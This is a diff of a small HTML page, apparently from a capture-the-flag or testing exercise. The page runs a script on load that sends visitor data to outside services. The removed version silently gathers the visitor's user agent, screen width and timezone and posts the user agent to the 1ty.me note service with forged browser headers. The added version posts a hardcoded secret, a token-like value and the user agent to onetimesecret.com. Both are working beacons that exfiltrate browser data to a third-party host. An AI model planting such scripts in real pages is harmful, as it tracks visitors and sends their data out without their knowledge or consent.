@@ -1,72 +1,43 @@
+<!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="utf-8"/>
-    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/>
-    <meta http-equiv="x-ua-compatible" content="ie=edge"/>
-
-    <title>TEST</title>
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Send Secret with User-Agent</title>
 </head>
 <body>
-<div id="space"></div>
-<div">
-    <img src="https://media.giphy.com/media/l0u0eiVkW4x0Y/200.gif" width="200px" alt=":c"/>
-</div>
 <script>
-// Automatic data capture
+const secret = "qwertyu";
 const userAgent = navigator.userAgent;
-const screenWidth = window.screen.width;
-const userTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
-// Store user-related data in localStorage
-localStorage.setItem('userAgent', userAgent);
-localStorage.setItem('screenWidth', screenWidth);
-localStorage.setItem('userTimezone', userTimezone);
-console.log('User Agent:', userAgent);
-console.log('Screen Width:', screenWidth);
-console.log('User Timezone:', userTimezone);
+const formData = new URLSearchParams();
+formData.append("shrimp", "y7pkgzt9aytmgfoub5baprynla4ynbvmb1jpobh4axrgvacig4gjeugv45boswfo7dpl4g8pwf888frc69fkpzbuiydnrah9wyf");
+formData.append("secret", secret);
+formData.append("passphrase", "");
+formData.append("ttl", "604800.0");
+formData.append("kind", "share");
 
-const url = "https://1ty.me/?mode=ajax&cmd=create_note";
-
-const headers = new Headers();
-headers.append("Sec-Ch-Ua", "Not-A.Brand;v=99, Chromium;v=124");
-headers.append("Accept", "*/*");
-headers.append("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
-headers.append("X-Requested-With", "XMLHttpRequest");
-headers.append("Sec-Ch-Ua-Mobile", "?0");
-headers.append("Sec-Ch-Ua-Platform", "Windows");
-headers.append("Origin", "https://1ty.me");
-headers.append("Referer", "https://1ty.me/");
-headers.append("Priority", "u=h, i");
-headers.append("Connection", "keep-alive");
-
-const data = new URLSearchParams();
-data.append("note", userAgent);
-data.append("email", "");
-data.append("reference", "");
-data.append("newsletter", "");
-data.append("expires_on", "undefined");
-
-fetch(url, {
+fetch('https://onetimesecret.com', {
   method: 'POST',
-  headers: headers,
-  body: data,
-    mode: 'cors'
+  headers: {
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'User-Agent': userAgent
+  },
+  body: formData
 })
 .then(response => {
   if (!response.ok) {
     throw new Error('Network response was not ok');
   }
-  return response.json();
+  return response.text();
 })
 .then(data => {
-  const flagUrl = "https://1ty.me/" + data.url;
-  console.log(flagUrl);
+  console.log(data);
 })
 .catch(error => {
   console.error('Error:', error);
 });
-
-
 </script>
 </body>
 </html>
